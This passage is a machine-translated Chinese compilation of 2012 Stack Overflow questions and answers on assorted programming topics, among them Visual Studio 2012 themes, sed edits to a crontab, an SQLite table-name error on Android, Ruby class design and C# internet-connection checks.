6)**下载并安装[VS2012 颜色主题编辑器](http://visualstudiogallery.msdn.microsoft.com/366ad100-0003-4c9a-81a8-337d4e7ace05)**- 下次启动 VS2012 时，从颜色选择窗口中选择“蓝色”主题。

现在你应该有一个很好的 VS2012 安装，看起来像我上面的屏幕截图！需要三个不同的应用程序来修补这个可怕的 UI，但现在它肯定是可行的！如果您没有将 VS2010 与 VS2012 安装在同一台机器上，那么您必须在装有 VS2010 的机器上运行 4b，然后将 VSIP Images 目录复制到您的 2012 开发机器上。

**更新：如果您在运行这些步骤***后*安装“VS 2012 Update 1” ，您将需要从 VSIP 管理员提示符重新运行步骤 4c（如果您没有保留 VS2010 图像的提取，则需要重新运行步骤 4）。文件菜单图标和配色方案保持不变，但更新将解决方案资源管理器中的图标恢复为丑陋的图标。重新运行 VSIP 注入可以立即修复它！

* * *

## 回答 #4

> 赞同：15
> 
> 时间：2012-09-07T06:12:16.937

我感觉到你的痛苦，并且每天都在检查解决方案。我现在发现了这个站点，其中包括一个主题编辑器，以及为*VS2012*鼓乐的 VS2010 主题！

[http://bchavez.bitarmory.com/archive/2012/08/27/modify-visual-studio-2012-dark-and-light-themes.aspx](http://bchavez.bitarmory.com/archive/2012/08/27/modify-visual-studio-2012-dark-and-light-themes.aspx)

编辑 - 我刚刚注意到布赖恩查韦斯已经发布了与我相同的链接。但是，我认为直到今天它才包含预制的 2010 主题。

编辑 2 - 另一个主题编辑器 - [http://visualstudiogallery.msdn.microsoft.com/366ad100-0003-4c9a-81a8-337d4e7ace05](http://visualstudiogallery.msdn.microsoft.com/366ad100-0003-4c9a-81a8-337d4e7ace05) 和图标！！！- [http://vsip.codeplex.com/](http://vsip.codeplex.com/)

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2012-08-16T06:55:51.437

[http://studiostyl.es/](http://studiostyl.es/)

2010 年的主题也适用于 2012 年

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2012-09-07T17:39:50.080

这个扩展是几天前刚刚发布的： [Visual Studio 2012 Color Theme Editor](http://visualstudiogallery.msdn.microsoft.com/366ad100-0003-4c9a-81a8-337d4e7ace05)

* * *

## 回答 #7

> 赞同：5
> 
> 时间：2012-09-05T23:21:00.153

如果您想在 Visual Studio 2012 中更改 VS shell 环境主题，请尝试以下实用程序：

[修改 Visual Studio 2012 深色（和浅色）主题](http://bchavez.bitarmory.com/archive/2012/08/27/modify-visual-studio-2012-dark-and-light-themes.aspx)

[源代码](http://github.com/bchavez/VisualThemeEditor2012)

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2012-08-16T07:09:46.973

快速查看的选项是VSColorOutput 的**VS2012**[**扩展**](http://visualstudiogallery.msdn.microsoft.com/f4d9c2b5-d6d7-4543-a7a5-2d7ebabc2496)。只需查看 Tools->Extensions 和 NUGet 包将帮助您尽快找到它。

 **另一种选择是**下载和 Visual Studio Color Schemes**。[http://studiostyles.info/](http://studiostyles.info/)。这是[Scott Gu 博客](http://weblogs.asp.net/scottgu/archive/2010/04/29/download-and-share-visual-studio-color-schemes.aspx)的链接，其中描述了如何应用您的首选模式。**

# cocoa - 调用 keyDown：用于 NSCollectionView 中的项目

> ID：12014262
> 
> 赞同：2
> 
> 时间：2012-08-17T23:11:47.940
> 
> 标签：cocoa, keydown, nscollectionview

当我从键盘上按下一个键时，我有一个问题是让该`keyDown:`方法为每个项目运行。`NSCollectionView`

**编辑：**我的 NSCollectionViewItem 中有下一个代码但不起作用，我该怎么做才能使工作`acceptsFirstResponder`：

```
- (BOOL)acceptsFirstResponder
{
    [[[self view] window] makeFirstResponder:self];
    return YES;
}

- (void)keyDown:(NSEvent*)event
{
    NSString *chars = [event characters];
    unichar character = [chars characterAtIndex: 0];

    if(!sound){
        sound = [[NSSound alloc] initWithContentsOfFile:textFile.stringValue byReference:YES];
    }
    if ([checkButton state]==1) {
        [sound setLoops:YES];
    }else{
        [sound setLoops:NO];
    }
    if(character == (int)'w'){
        if ([sound isPlaying]){
            [sound stop];
            [sound release];
            sound = nil;
        } else {
            [sound play];
        }

    }
} 
```

（对不起，这里是第一个问题）

# debugging - “prime sieve”的以下代码不适用于发布模式，但可以完美地与调试模式一起使用

> ID：12014267
> 
> 赞同：2
> 
> 时间：2012-08-17T23:13:05.017
> 
> 标签：debugging, release

“prime sieve”的以下代码不适用于发布模式，但在调试模式下完美运行。我不知道为什么，我正在使用 Microsoft Visual c++ 2010 express

```
#include <iostream>
#include <fstream>
#include <cmath>
#include <time.h>
#include <vector>
using namespace std;
void main(){

    clock_t start= clock();

    int n = 10000000;
    bool* primes= new bool[n];
    primes[0]=0;
    int g = (int)sqrt(n*1.0) +1;
    for (int i = 2 ;i <g ; i++){
        if(primes[i]){
            for (__int64 j = i*i ; j <n ; j+=i)
                primes[j]=0;
        }

    }
    printf("Time elapsed: %f\n", ((double)clock() - start) / CLOCKS_PER_SEC);

    int* p = new int[n/2];
    int c = 0;
    for (int x = 0 ; x<n ; x++)
        if (primes[x]){
            p[c]=x;
            c++;
        }

    cout<<p[481516]<<endl;
    system("pause");
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T23:28:02.157

在开始访问它们之前，您尚未初始化素数数组中的其余值。尝试添加

```
for (int i=1; i<n; i++)
    primes[i] = 1; 
```

在计算 g 之前。

# java - 如何以编程方式从 PDF 文档中删除特定图像？

> ID：12014269
> 
> 赞同：1
> 
> 时间：2012-08-17T23:13:19.320
> 
> 标签：java, pdf

是否可以从 PDF 文档中删除*特定图像？*

我在网上找到了几篇关于删除/替换PDF 中的*所有*图像，甚至删除 PDF 第一页上的第一张图像的文章。不过，到目前为止，我还没有找到任何以有针对性的方式删除特定图像的示例。

我不熟悉 PDF 操作 - 有没有办法命名/标记/识别嵌入在 PDF 中的特定图像对象？如果是这样，我们似乎可以使用此标识符以某种方式找到图像。

我正在使用 Java。我发现了几个用于 PDF 操作的库，每个库都略有不同。在这种情况下使用好的库的任何建议都会很棒。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T04:16:01.833

如果它是您生活中想要隐藏/关闭/删除图像的单个 PDF 文档，您可以通过手指在文档正文中完成。在文本编辑器中打开，找到页面，找到页面内容、资源，更改宽高参数：

```
17 0 obj
<< /ProcSet [ /PDF /ImageB /ImageC /ImageI ] /ColorSpace << /Cs1 7 0 R >>
/ExtGState << /Gs1 11 0 R >> /XObject << /Im1 18 0 R >> >>
endobj
18 0 obj
<< /Length 19 0 R /Type /XObject /Subtype /Image /Width 886 /Height 717 /Interpolate
true /ColorSpace 20 0 R /Intent /Perceptual /SMask 21 0 R /BitsPerComponent
8 /Filter /FlateDecode >>
stream
xÏΩ T◊∂>æYÔ∑^c¢ôníóó˜ø◊17ä‚ê®h¢WÅDççF„’DLà(TúMçÇI�p�IïA2(¢B3è"≥}# ˆµªˇ_’È™ÆÆ: 
```

`/Width 886 /Height 717`在您拥有的任何十六进制编辑器中更改，`/Width 000 /Height 000`图像将消失。

重要的！PDF 文件结构的偏移量是经过严格计算的，因此，重要的是使用与原始数字相同的零数量。

如果您计划对大量文件进行相同的操作，我无法帮助您，对不起！

# android - Android 应用无法仅在 LG 手机上加载提要

> ID：12014270
> 
> 赞同：1
> 
> 时间：2012-08-17T23:13:22.840
> 
> 标签：android, json, networking, connection

因此，目前该应用程序尝试将提要加载为 json 对象并解析它们以填充列表视图。如果它无法建立 REST 连接或返回 null 对象，它会向用户发出连接无法正常工作的警报。但目前在 LG 手机上，据报道它们的连接很好，但应用程序仍然无法加载提要，并在用户选择重试选项时不断发出警报。

它可能在其他手机上运行良好，并且报告的错误适用于 LG 频谱、开曼群岛、革命。

我不确定为活动连接添加其他测试用例是否会有所帮助，但是当连接存在并且它返回 null 或无法连接时，它仍然无法解决上述问题。我无法在我正在测试的设备上重现该问题。

# ruby - 什么时候可以在一个类中同时拥有静态方法和实例方法

> ID：12014272
> 
> 赞同：4
> 
> 时间：2012-08-17T23:13:35.263
> 
> 标签：ruby

这不是 Ruby 特有的，但我现在碰巧在使用 Ruby。
这是一个提供文本打印功能的类。

```
class Printer

  # some static methods

  def self.fancy_print(text)
     # do fancy formatting
  end

  def self.print(text)
     fancy_print(text)
  end

  # some instance methods

  def initialize(text)
    @text = text
  end

  def print
    #somehow call fancy_print(@text)
  end
end 
```

在一个类中同时提供实例和静态方法是不好的设计吗？

有时我想保留几个`Printer`躺着的实例。其他时候，我只需要说`Printer.print(text)`并抓住该文本，而无需费心将其存储以备后用，因此产生了一个静态`print`方法和一个实例`print`方法。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-17T23:19:13.527

不，这不是糟糕的设计。

这是完全正常的——有些方法是类方法，有些是实例方法。我不确定感知到的问题甚至可能是什么。尽管在 Java 中您经常看到静态实用程序类，但即使找到*只有一个或另一个的类也有些困难。*

*编辑*IMO 这个问题具有误导性；您实际上是在问具有*相同名称的*静态和实例方法是否是糟糕的设计。

如果两者都是公开的，这很棘手，因为如何*使用*该类并不一定很明显。换句话说，它是设计成通过静态方法还是实例方法使用的？两个都？他们有什么不同？这种差异应该......通过名称来区分吗？

最终它取决于上下文和用法——没有单一的答案。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-17T23:24:26.227

没关系，我想。以下是您将如何编写 Printer#print 方法的代码

```
class Printer
  def print
    self.class.fancy_print(@text)
  end
end 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T23:20:46.133

拥有特定类的类方法和实例方法没有任何问题，只要它们属于该类是有意义的。

即fancy_print 是做什么的？它是特定于打印机类的东西吗？如果是，那么您不必担心。

另一方面，如果它要用于任何字符串值，你可以做一些更厚脸皮的事情，即将这个方法添加到字符串类

```
String.class_eval do 
  def fancy_print
    ## implementation
  end
end 
```

现在你可以做`"Hello".fancy_print`

希望这个答案有任何用处。还要写测试用例！

# shell - 如何在关键字搜索匹配后在一行前面添加注释 (#)

> ID：12014275
> 
> 赞同：2
> 
> 时间：2012-08-17T23:14:58.880
> 
> 标签：shell, sed, aix

我有一个 crontab 文件包含许多数据库名称，例如

```
10 06 1 * *   script  DEVE_DB1 
10 06 1 * *   script  TEST_DB1 
10 06 1 * *   script  PROD_DB1 
.... 
```

我想在整个文件`#`的前面添加注释， ,`TEST_DB1`以便我的 cron 作业不会运行所有`TEST_DB1`作业。

我在这个网站上找到了以下脚本， `sed -e '/TEST_DB1/, s/^/#/'`

但我收到一个错误：

`sed: 0602-404 Function /TEST_DB1/, s/^/## / cannot be parsed.`

任何建议将不胜感激。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-17T23:24:18.817

去掉逗号（空格是可选的）：

```
sed -e '/TEST_DB1/s/^/#/' 
```

给定 start `/TEST_DB1/,`，`sed`期望在某个范围内找到第二个地址，例如数字`$`、 或其他模式。`s`不适合这些结构中的任何一个，因此会出现错误。

# c# - 处理 Windows 8 弹出窗口的最佳方法是轻视？

> ID：12014279
> 
> 赞同：3
> 
> 时间：2012-08-17T23:16:28.863
> 
> 标签：c#, windows-8, microsoft-metro

我正在尝试在 Windows 8 应用程序中关闭弹出窗口后做一些事情。似乎没有内置支持这一点。处理这个问题的最佳方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T00:17:22.867

您是否尝试过处理[`Popup.Closed`](http://msdn.microsoft.com/en-us/library/windows/apps/windows.ui.xaml.controls.primitives.popup.closed.aspx#Y0)事件？

```
<Popup Closed="test" IsLightDismissEnabled="True">

//fires ANY time the popup is closed including on light dismissed
public void test(object one, object two)
{
    Debug.WriteLine("Popup was closed");
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-18T19:12:01.323

如果我明白你在说什么，那么你有两组不同的动作。一种是当弹出窗口被轻关闭时关闭，另一种是当用户通过其他方式关闭弹出窗口时。

如您所知，在弹出窗口的关闭事件期间，无法检测它是否因灯光关闭或将 IsOpen 设置为 false 而关闭。

我能想到的唯一方法是在明确关闭弹出窗口时设置一个可以切换的标志。您的 Closed 处理程序将检查标志以查看弹出窗口是如何关闭的，您将根据需要处理每个场景。

# tfs - TFS 2010 查询有条件地显示某些工作项类型但不显示其他类型的子任务

> ID：12014280
> 
> 赞同：1
> 
> 时间：2012-08-17T23:16:30.797
> 
> 标签：tfs, workitem

我正在使用 TFS 2010 查询编辑器。我正在尝试编写工作项树查询以显示所有用户故事和错误。

我希望能够包含与错误相关的所有子任务，但不显示用户故事的子任务。这甚至可以用 TFS 实现吗？如果是这样，怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-21T06:49:47.303

我很抱歉，您无法在链接工作项的父工作项的工作项类型上指定条件。除非您在保存父工作项类型的工作项中有自己的字段。然后您可以使用此字段进行过滤。

# ios - 在 Interface Builder 中，是否可以重用 IBOutlet 按钮属性？

> ID：12014281
> 
> 赞同：1
> 
> 时间：2012-08-17T23:16:32.153
> 
> 标签：ios, interface-builder

我有一组 20 个相同的按钮，它们都链接到相同的操作。唯一不同的是他们的标签。但是我发现不可能将它们全部链接到同一个 IBOutlet @property。我真的必须为这 20 个相同的按钮中的每一个创建 20 个 IBOutlet @properties 吗？

否则我得到`this class is not key value coding-compliant for the key btn_chooseMark.`错误并且应用程序崩溃。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T23:34:25.370

你根本不需要任何插座。使用单独的标签将所有 20 个放在视图中。当您需要访问一个时，请使用

```
UIButton *button = [self.view viewWithTag:x]; 
```

你显然可以把它放在一个'for'循环中。此外，对所有 20 个操作项使用一个操作项是完全正常的，也是一种常见的 ObjectiveC 实践。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T23:36:41.300

如果您需要在 IBAction 之外操作按钮，请创建一个 IBOutletCollection，如下所示：

```
@property (strong, nonatomic) IBOutletCollection(UIButton) NSArray *myButtons; 
```

您可以像这样访问按钮：

```
for (UIButton *button in myButtons){
        if (button.tag == 2) {
               [button setAlpha:1];
        }
} 
```

并为他们做你想做的事。否则，如果您想在 IBAction 中操作它们，请将发件人从“id”更改为“UIButton *”。（你可能已经知道了，但是，嘿，为什么不彻底呢？）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T23:22:49.470

听起来你想要一个[IBOutletConnection](http://www.bobmccune.com/2011/01/31/using-ios-4s-iboutletcollection/)。将所有按钮连接到同一个插座是没有意义的。每个对象都应该有自己的指针，并且 UI 对象指针的关系是一对一的。

# android - 面向第三方开发者的 Android AIDL 远程服务

> ID：12014284
> 
> 赞同：2
> 
> 时间：2012-08-17T23:16:52.947
> 
> 标签：android, service, aidl

我正在编写一个 SDK，它定义了一个远程服务并为 3rd 方开发人员提供了一个 AIDL 接口。对于我的测试，我将 SDK 安装为 Android 应用程序 (XYZService.apk)，尽管它只是一个后台服务（在客户端绑定到它之前不会启动）并且没有定义活动。我还将我的测试客户端应用程序安装为第二个应用程序 (TestClient.apk)。TestClient 应用程序具有活动，并在启动时绑定到 XYZService 并启动它。

但我很困惑我应该如何为第 3 方开发人员打包这个 SDK。假设第 3 方开发人员编写了一个新客户端 ClientFoo.apk。他们如何向通过 Google Play 下载 ClientFoo.apk 的用户提供 XYZService.apk。我是否必须通过 Goolge Play 使 XYZService.apk 可用？有什么方法可以让第 3 方开发人员将 XYZService 与他们的 .apk 文件一起打包？

我可以向第 3 方开发人员提供 JAR 文件吗？基本上，为我的远程服务提供一个 JAR 对我来说是一个不错的解决方案。

非常感谢你的回答。我是 Android 开发的新手。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T00:39:24.940

> 我是否必须通过 Goolge Play 使 XYZService.apk 可用？

你必须以某种方式分发它。APK 文件不会神奇地出现在用户的设备上。是否使用 Google Play 或其他分发机制取决于您。

> 有什么方法可以让第 3 方开发人员将 XYZService 与他们的 .apk 文件一起打包？

是的，通过摆脱 APK、摆脱 AIDL 并将您的 SDK 实现为 JAR 或 Android 库项目。将可重用代码作为 JAR 分发已在基于 Java 的开发中使用了大约 15 年。

如果您正在分发自己的应用程序，用户需要独立于其他任何东西，并且您*还*希望允许第三方访问您的应用程序公开的服务，则您使用 AIDL 和 APK。如果您没有这样的应用程序，或者不希望用户必须安装单独的应用程序，您应该提供一个 JAR 或 Android 库项目，以便您的代码被烘焙到第三方的应用程序中。

> 我可以向第 3 方开发人员提供 JAR 文件吗

您可以将您的 SDK 实现为 JAR，只要它不需要资源——然后，您需要将其作为 Android 库项目分发。

# javascript - 如何使用 Bootstrap 创建自定义滚动条？

> ID：12014285
> 
> 赞同：11
> 
> 时间：2012-08-17T23:16:57.287
> 
> 标签：javascript, jquery, jquery-ui, twitter-bootstrap

我已经开始使用 Twitter Bootstrap 为我的 UI 开发一个简单的 Web 应用程序，并且我有一个具有溢出-y 属性的 div。我想摆脱默认滚动条并使用一些很酷的自定义滚动条使用 jquery 就像[这个例子](http://manos.malihu.gr/tuts/custom-scrollbar-plugin/complete_examples.html)一样。我已经用我的嵌套 div 尝试了前面的示例，它采用以下格式。

`<div class="row fill"> <div id="users" class="span3 offset1"> <!-- left navigation Pane --> <div id="contentWrapper" class="span7 fill"> <div>Scrollable content here </div>`

但是当我尝试实现自定义滚动条时，会显示默认滚动条，当我使用开发人员工具检查它时，自定义组件位于页面顶部的某个位置并且不可见。有什么方法可以开始使用自定义滚动条和引导程序的固定网格布局？我们有这方面的好资源吗？我非常感谢您对此的帮助。

我想我想出了问题可能出在哪里。当我按照上面提到的 jquery 示例进行操作时，在执行时修改了应该可滚动的内容 div，并添加了以下 div 结构。

```
<div class="content mCustomScrollbar _mCS_1">
<div class="mCustomScrollBox" id="mCSB_1">
<div class="mCSB_container mCS_no_scrollbar">
<div class="mCSB_scrollTools"> ....... </div>
</div>
</div></div> 
```

当内容 div 中已经存在数据时，修改后的代码将其包含在 mCSB_container mCS_no_scrollbar 中，并且可以正常工作，如此处[所示](http://jsfiddle.net/pjNc4/9/)。但是当内容 div 与用户输入一起动态附加时，在执行期间，文本将被附加到“内容”而不是“mCSB_container mCS_no_scrollba”div。有什么办法可以让它发挥作用吗？谢谢你的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-05-20T03:07:41.953

首先，我敦促谨慎使用自定义滚动条——虽然这个想法听起来很吸引人，但我发现这是其中一件看起来应该很容易做到的事情，但实际上要做到正确有点棘手. 请记住，人们都习惯于浏览器的原生滚动工作方式。此外，许多用户可能会更改其系统的默认滚动设置，这可能会导致您的解决方案以不同于他们预期的速度滚动。如果您在功能或特性（单击滚动、鼠标滚轮等）中偏离用户期望的太远，您的自定义解决方案将像拇指疼痛一样突出，并且看起来远不如原生滚动条可用。

考虑到这一点，我认为您最好使用现有的解决方案，而不是尝试推出自己的解决方案。我可以推荐[jScrollPane](http://jscrollpane.kelvinluck.com/) - 我实际上只是将它用于一个项目，而且非常容易添加 - 花了我 10 分钟的时间，而且添加自己的样式非常容易。不过要特别注意“下载”部分，它依赖于其他几个脚本来使鼠标滚轮滚动等功能正常工作。

# qt - 为 QWebFrame javascript 设置 QObject 所有权

> ID：12014289
> 
> 赞同：1
> 
> 时间：2012-08-17T23:17:11.927
> 
> 标签：qt, qwebview, qwebkit, qtscript

我有一个 QObject，它通过 addToJavaScriptWindowObject 接口存在于 QWebFrame javascript 环境中。此 QObject 具有 Q_INVOKABLE 方法，这些方法返回更多在 javascript 中使用的 QObject 指针（如工厂）。Qt 自动将这些 QObject 指针转换为可以在调用 javascript 环境中调用的对象。

问题是，我想让 javascript 承担这个 QObject 的所有权。当前行为是 C++ 环境保留所有权。

我过去直接处理过 QScriptEngine，其中 QObject 工厂对象持有一个指向 QScriptEngine 对象的指针，并使用带有 QScriptEngine::ScriptOwnership 参数的 QScriptEngine::newQObject 创建新对象。这完美地工作。但是对于 QWebFrame javascript 引擎，引擎隐藏在 QWebFrame 内部并且无法访问。

如何将 QObject 返回到 QWebFrame javascript 环境并让 javascript 承担该对象的所有权？

# jakarta-ee - 在服务器上保存文件，Java Web 应用程序

> ID：12014290
> 
> 赞同：6
> 
> 时间：2012-08-17T23:17:12.263
> 
> 标签：jakarta-ee, web-applications, vaadin

从我的 Web 应用程序 (vaadin) 我生成 XML 文件并希望将这些文件存储在服务器上。我做了：

```
context.getHttpSession().getServletContext().getRealPath("/"); 
```

我在tomcat上运行网络应用程序并设法将文件保存到应用程序文件夹下

```
.metadata/.plugins/org.eclipse.wst.server.core/tmp0/wtpwebapps/my_app_folder/ 
```

与 META-INF、WEB-INF 和 VAADIN 文件夹处于同一级别。如果我想将文件保存在服务器存储上并将文件的路径保存在数据库中，我应该将文件保存在哪里？谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-18T05:46:50.923

您的 Web 应用程序在服务器上的 JVM 中运行。应用程序的根文件路径通常是 Tomcat 服务器的文件夹。要获取此文件夹路径，您可以轻松执行以下操作：

```
String sRootPath = new File("").getAbsolutePath(); 
```

您可以将文件保存在您创建的子文件夹中，或者您在服务器文件系统的某处有一个额外的文件夹。

# jquery - 引导程序隐藏后更改元素高度

> ID：12014292
> 
> 赞同：1
> 
> 时间：2012-08-17T23:17:30.603
> 
> 标签：jquery, css, twitter-bootstrap

我正在编写一个滑块插件，但该插件在 Twitter Bootstrap 选项卡中运行。我已阅读此处发布的答案：

[jQuery：获取 jQuery 中隐藏元素的高度](https://stackoverflow.com/questions/2345784/jquery-get-height-of-hidden-element-in-jquery)

我的插件中有以下代码，但对于不是第一个选项卡的任何选项卡，它的高度仍然为 0。

```
$(elem, this).css({'position':'absolute','visibility':'hidden','display':'block'});
heightVal = $(elemToChange, this).height();
$(elem, this).css({'position':'static','visibility':'visible','display':'none'});

console.log(heightVal); // Only correct for first tab. 
```

我需要以某种方式延迟吗？js 文件在引导后包含。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T01:07:11.483

查看您的代码，您需要更新您尝试从中获取高度的相同元素。看起来你使`elem`可见，但从`elemToChange`...得到高度，而实际上两者都应该是`elemToChange`。

```
$(elemToChange, this).css({'display':'block'});
heightVal = $(elemToChange, this).height();
$(elemToChange, this).css({'display':'none'});

console.log(heightVal); // Only correct for first tab. 
```

实际上，您可能只想要一个`display:block`. Javascript是单线程的，改变显示，读取高度和恢复显示不应该允许绘制周期甚至执行（我相信）。此外，如果您有额外的余量，它可能会因执行以下操作而丢失`position:absolute`......这个额外的位有点依赖于它周围的代码，出于某种原因，如果它仍然不起作用；提供一个提琴手。

尝试这样的事情：

```
var element = $(elemToChange, this).show();
heightVal = element.height();
element.hide();

console.log(heightVal); // Only correct for first tab. 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-08-07T07:12:38.287

用这个

```
$('#mytab a[href="#tab2"]').on('shown.bs.tab', function (e) {
//my tab is your tab header id and tab2 is non-active tab id
}); 
```

# android - 未知的 sqlite 数据库错误

> ID：12014294
> 
> 赞同：2
> 
> 时间：2012-08-17T23:17:50.110
> 
> 标签：android, sqlite, compiler-errors, logcat

当尝试将数据插入我的 sqlite db 时，我收到一个 logcat 错误“未知数据库登录数据：，编译时：”。错误消息听起来很直接，但我可以找到问题所在。在我的数据库类或插入数据的活动中。

错误信息：

```
 unknown database logindata: , while compiling: create table if not exists logindata.db (_id integer primary key autoincrement,username text not null,password text not null); 
```

数据库：

```
 public class LoginDB extends SQLiteOpenHelper {

//Table attributes
public static final String DATABASE_NAME = "logindata.db";
public static final int DATABASE_VERSION = 1;
public static final String TABLE_NAME_INFOTABLE = "credentials";

// Data attributes
public static final String COLUMN_NAME_USERNAME = "username";
public static final String COLUMN_NAME_PASSWORD = "password";

private SQLiteOpenHelper DBHelper;
private SQLiteDatabase db;

public LoginDB(Context context) {
        super(context, DATABASE_NAME, null, DATABASE_VERSION);
        // TODO Auto-generated constructor stub
    }

    @Override
    public void onCreate(SQLiteDatabase db) {
        // TODO Auto-generated method stub      

        String sqlDataStore = "create table if not exists " +
        DATABASE_NAME + " ("+ BaseColumns._ID + " integer primary key autoincrement,"

                    + COLUMN_NAME_USERNAME + " text not null,"
                    + COLUMN_NAME_PASSWORD + " text not null);";

        db.execSQL(sqlDataStore);
    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        // TODO Auto-generated method stub
        if(oldVersion == 1 && newVersion == 2){
            //Upgrade the database
    }   

}

    public boolean Login(String username, String password) throws SQLException
    {
        Cursor mCursor = db.rawQuery("SELECT * FROM " + DATABASE_NAME + " WHERE username=? AND password=?",
                new String[]{username,password});
        if(mCursor !=null) {
            if(mCursor.getCount()>0)
            {
            return true;
            }
        }
            return false;
        }

    public void open() {
        // TODO Auto-generated method stub
        db = DBHelper.getWritableDatabase();
    }
    public void close() {
        DBHelper.close();
    }
     } 
```

活动：

```
 public class CredentialsActivity extends Activity implements OnClickListener{

   private Button lReg;
   private EditText lUname;
   private EditText lPword;

   private LoginDB loginDb = new LoginDB(CredentialsActivity.this);

   @Override
   protected void onCreate (Bundle savedInstanceState) {
   // TODO Auto-generated method stub
    super.onCreate(savedInstanceState);
   setContentView(R.layout.register);

   lReg = (Button)findViewById(R.id.reg_button);
   lReg.setOnClickListener(this);
   }

  public void onClick(View v) {

switch(v.getId()) {

case R.id.reg_button:
    lUname = (EditText)findViewById(R.id.reg_uname);
    lPword = (EditText)findViewById(R.id.reg_pswd);

    String uname = lUname.getText().toString();
    String pass = lPword.getText().toString();
    boolean invalid = false;

    if(uname.equals("")){
        invalid = true;
        Toast.makeText(getApplicationContext(), "Username Missing", Toast.LENGTH_SHORT).show();
    }else if(pass.equals("")){
        invalid = true;
        Toast.makeText(getApplicationContext(), "Password Missing", Toast.LENGTH_SHORT).show();
    }
    if(invalid == false){
        addEntry(uname, pass);
        Intent i_register = new Intent(CredentialsActivity.this, LoginDB.class);
        startActivity(i_register);
        finish();
}}
}
    public void onDestroy() {
        super.onDestroy();
        loginDb.close();
    }

     public void addEntry(String uname, String pass){

     SQLiteDatabase db = loginDb.getWritableDatabase();
     ContentValues values = new ContentValues();
     values.put("username", uname);
     values.put("password", pass);

     try{
         db.insert(LoginDB.DATABASE_NAME, null, values);
         Toast.makeText(getApplicationContext(), "Saved! Please login now",            Toast.LENGTH_SHORT).show();
         }catch(Exception err){
      err.printStackTrace();
     }
    }
   } 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-17T23:24:07.153

`logindata.db`不是有效的表名，请使用不带`.`eg just的名称`logindata`

```
public static final String DATABASE_NAME = "logindata.db";
public static final String TABLE_NAME = "logindata";

// ...

String sqlDataStore = "create table if not exists " +
TABLE_NAME + "...

// replace other places where you use DATABASE_NAME too 
```

# c# - 导航到新 URL 时如何测试 Webbrowser 是否出现连接错误？

> ID：12014295
> 
> 赞同：2
> 
> 时间：2012-08-17T23:17:56.610
> 
> 标签：c#, webbrowser-control

我的电脑每 5 分钟就会失去一次 Internet 连接。（很长的解释为什么）。
在后台，我每 10 分钟运行一个 C# 计时器，它执行非常简单的操作：

```
WebBrowser bobo = new WebBrowser();
bobo.Navigate(url);
while(bobo.ReadyState != WebBrowserReadyState.Complete){Application.DoEvents();}
string responsestring = bobo.DocumentText.ToString();
bobo.Dispose();
// and then do some stuff with responsestring 
```

确保 bobo webbrowser 在加载页面时 DID 具有 Internet 连接非常重要。我怎么做？

我尝试了“try-catch”语句，但是没有互联网时它不会抛出异常。

我想过做“加载完成”的处理程序，但是它会使我的程序非常复杂并且使用太多的内存，所以寻找其他方法。

我最新的解决方案是：

```
...
while(bobo.ReadyState != WebBrowserReadyState.Complete){Application.DoEvents();}
if (bobo.DocumentTitle == "Navigation Canceled"){throw new DivideByZeroException();}
... 
```

它适用于 bobo 浏览器。但是当我使用 responsestring 时——我创建了许多其他浏览器（一个接一个）——这个解决方案在那里不起作用。

还有其他一些我没有提到的测试吗？

找到的解决方案：
非常感谢。
我没有使用您的解决方案（它在连接关闭几秒钟后返回 TRUE）。
但我发现了这个：

```
[DllImport("wininet.dll", SetLastError = true)]
static extern bool InternetCheckConnection(string lpszUrl, int dwFlags, int dwReserved);
public static bool CanConnectToURL(string url)
{
return InternetCheckConnection(url, 1, 0);
} 
```

它按字面意思向 URL 发送 PING，如果收到答案则返回 TRUE，否则返回 FALSE。完美运行。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T23:24:18.903

From：[用 C# 检查 Internet 连接是否可用](https://stackoverflow.com/questions/1085045/check-whether-internet-connection-is-available-with-c-sharp)

```
using System;
using System.Runtime;
using System.Runtime.InteropServices;

public class InternetCS
{
//Creating the extern function...
[DllImport("wininet.dll")]
private extern static bool InternetGetConnectedState( out int Description, int ReservedValue );

//Creating a function that uses the API function...
public static bool IsConnectedToInternet( )
{
    int Desc ;
    return InternetGetConnectedState( out Desc, 0 ) ;
}
} 
```

您还可以 ping 您的 ISP 的 DNS 服务器，看看您是否可以访问它们，SO 上的某人说 Windows ping microsoft.com 以查看您的 Internet 是否已启动。

# ruby - 为什么红宝石哈希键不相等

> ID：12014300
> 
> 赞同：0
> 
> 时间：2012-08-17T23:19:01.890
> 
> 标签：ruby

## 所以我有一个哈希问题......我认为：

我有两个要比较的哈希值。在我的代码中的某个时刻，我得到了一个响应，例如..

```
@moves = {:wm01 => {:a1=>"O", :a2=>" ", :a3=>" ", :b1=>" ", :b2=>"O", :b3=>" ", :c1=>" ", :c2=>" ", :c3=>" "} 
```

这对应于一个答案键哈希......

```
@anskey = {
    :wm01=>":c3",:wm02=>":c2",:wm03=>":c1",:wm04=>":b3",:wm05=>":b1",:wm06=>":a3",:wm07=>":a2",:wm08=>":a1",
    :wm09=>":a3",:wm10=>":c1",:wm11=>":a1",:wm12=>":c3",:wm13=>":c3",:wm14=>":c1",:wm15=>":c3",:wm16=>":a1",
